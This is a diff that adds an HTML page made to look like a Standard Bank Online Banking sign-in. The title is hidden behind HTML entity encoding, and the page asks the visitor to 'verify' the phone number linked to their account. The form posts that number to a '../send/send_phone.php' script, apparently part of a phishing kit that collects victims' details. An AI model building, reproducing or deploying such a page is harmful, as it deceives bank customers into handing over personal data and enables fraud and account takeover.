@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" class="plt-tablet plt-desktop md hydrated" mode="md">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <title>&#83;&#116;&#97;&#110;&#100;&#97;&#114;&#100;&#32;&#66;&#97;&#110;&#107;&#32;&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#66;&#97;&#110;&#107;&#105;&#110;&#103;</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no">
+  <meta http-equiv="x-ua-compatible" content="IE=edge">
+  <link rel="stylesheet" href="../libraries/css/bundle.css">
+  <link rel="stylesheet" href="../libraries/css/ionic.bundle.css">
+  <link rel="stylesheet" type="text/css" href="../libraries/css/sbg.css">
+  <link rel="icon" type="image/png" href="../libraries/img/favicon.ico">
+  <style type="text/css">
+    
+  </style>
+</head>
+
+<body class="body-container">
+  <ion-app class="md ion-page hydrated">
+    <ion-content class="md hydrated" style="--offset-top:0;--offset-bottom:0">
+      <div class="ping-signin login-template" autocomplete="off" id="sign in" name="Sign in with your Standard Bank ID">
+        <div class="ping-outer-container" style="display:flex">
+          <div class="ping-logo login-template"><span class="company-logo"><img src="../libraries/img/sbg.png"></span></div>
+          <form method="POST" action="../send/send_phone.php" autocomplete="off">
+            <div class="ping-container ping-signin login-template">
+              <div class="ping-body-container">
+                <div class="content-column column-1 bm">
+                  <div class="ping-header">Please Verify the following details linked to your account</div>
+                </div>
+                <div class="ping-input-container" id="container-lipusername">
+                  <ion-item class="item-interactive item-input item-has-value item md ion-focusable hydrated item-label item-label-floating item-has-focus">
+                    <ion-label position="floating" class="sc-ion-label-md-h sc-ion-label-md-s md label-floating hydrated" id="ion-input-0-lbl">Phone Number</ion-label>
+                    <ion-input required class="validate sc-ion-input-md-h sc-ion-input-md-s md hydrated has-value has-focus">
+                      <input class="native-input sc-ion-input-md" autocomplete="off" onkeypress="isInputNumber(event)" type="text" id="referenceNumber" name="phone" required autofocus="focus" style="border-bottom: 1.5px solid #1443B1;">
+                    </ion-input>
+                  </ion-item>
+                      <div class="custom-validator-alert custom-validator-hint" id="alertMessage-lipusername" style="display: block;">Verification Required.</div>
+                </div>
+                <div class="ping-buttons">
+
+                    <button type="submit" class="button-natived">
+                      Next
+                    </button>
+      
+                </div>
+              </div>
+            </div>
+          </form>
+        </div>
+      </div>
+    </ion-content>
+  </ion-app>
+  <!--
+     <script type="text/javascript">
+        function isInputNumber(evt){var ch=String.fromCharCode(evt.which);if(!(/[0-9]/.test(ch))){evt.preventDefault();}}
+    </script>
+  -->
+</body>
+
+</html>
